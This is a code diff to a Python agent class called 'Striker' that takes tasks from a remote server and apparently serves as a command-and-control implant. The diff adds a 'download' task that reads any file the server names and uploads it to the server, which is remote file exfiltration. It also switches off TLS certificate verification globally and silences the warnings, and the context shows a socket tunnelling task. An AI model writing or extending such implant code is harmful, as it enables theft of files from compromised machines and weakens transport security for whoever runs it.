@@ -8,6 +8,10 @@ from time import sleep
 import threading
 import urllib3
 import socket
+import warnings
+
+INSECURE_SSL = True
+if (INSECURE_SSL): warnings.filterwarnings("ignore")
 
 class Striker:
 
@@ -43,7 +47,7 @@ class Striker:
 
   def httpGet(self, url):
     try:
-      br = urllib3.PoolManager()
+      br = urllib3.PoolManager() if not INSECURE_SSL else urllib3.PoolManager(cert_reqs='CERT_NONE') 
       res = br.request('GET', url)
       return (res.status, res.data.decode('utf-8'))
     except Exception as e:
@@ -51,19 +55,25 @@ class Striker:
 
   def httpPost(self, url, body):
     try:
-      br = urllib3.PoolManager()
+      br = urllib3.PoolManager() if not INSECURE_SSL else urllib3.PoolManager(cert_reqs='CERT_NONE')
       res = br.request('POST', url, body=json.dumps(body).encode('utf-8'), headers={'Content-Type': 'application/json'})
       return (res.status, res.data.decode('utf-8'))
     except Exception as e:
       return (0, str(e))
 
   def httpDownload(self, url, filename):
+    br = urllib3.PoolManager(cert_reqs='CERT_NONE')
     wfo = open(filename, "wb")
-    br = urllib3.PoolManager()
     res = br.request('GET', url, preload_content=False)
     for chunk in res.stream(4096): wfo.write(chunk)
     res.release_conn()
     wfo.close()
+    return
+
+  def httpUpload(self, url, filename):
+    br = urllib3.PoolManager() if not INSECURE_SSL else urllib3.PoolManager(cert_reqs='CERT_NONE')
+    data = open(filename, "rb").read()
+    br.request("POST", url, fields={"file": (os.path.basename(filename), data)})
     return
 
   def info(self):
@@ -198,6 +208,14 @@ class Striker:
         successful = 1
       except Exception as e:
         result = "Error uploading file: " + str(e)
+    elif (task["taskType"] == "download"):
+      try:
+        url = self.baseUrl + "/agent/upload/" + self.uid + "/" + taskID
+        self.httpUpload(url, data["file"])
+        result = "File downloaded: " + data["file"]
+        successful = 1
+      except Exception as e:
+        result = "Error downloading file: " + str(e)
     elif (task["taskType"] == "tunnel"):
       sock = socket.socket()
       sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
